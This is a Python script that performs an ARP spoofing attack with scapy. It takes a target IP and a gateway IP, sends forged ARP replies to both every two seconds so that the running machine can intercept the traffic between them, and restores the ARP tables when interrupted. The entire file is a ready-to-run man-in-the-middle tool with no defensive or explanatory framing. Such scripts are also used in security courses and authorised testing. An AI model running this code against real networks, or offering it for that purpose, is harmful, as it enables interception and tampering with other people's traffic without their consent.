#!/usr/bin/env python

import argparse
import re
import scapy.layers.l2 as l2
import scapy.all as scapy
import time
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address you want to spoof.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="IP address of the gateway.")
    options = parser.parse_args()
    target_check = re.search(r"^(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$", str(options.target_ip))
    if not target_check:
        parser.error("Please specify a valid IP address for the target, use --help or -h for information.")
    gateway_check = re.search(r"^(\b25[0-5]|\b2[0-4][0-9]|\b[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$", str(options.gateway_ip))
    if not gateway_check:
        parser.error("Please specify a valid IP address for the gateway, use --help or -h for information.")
    return options


def get_mac(ip):
    arp_request = l2.ARP(pdst=ip)
    broadcast = l2.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = l2.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


user_input = get_arguments()
try:
    packet_counter = 0
    while True:
        spoof(user_input.target_ip, user_input.gateway_ip)
        spoof(user_input.gateway_ip, user_input.target_ip)
        packet_counter = packet_counter + 1
        print("\rPackets sent: " + str(packet_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nExiting script. Restoring ARP tables, please wait.\n")
    restore(user_input.target_ip, user_input.gateway_ip)
    restore(user_input.gateway_ip, user_input.target_ip)
    print("Done.")
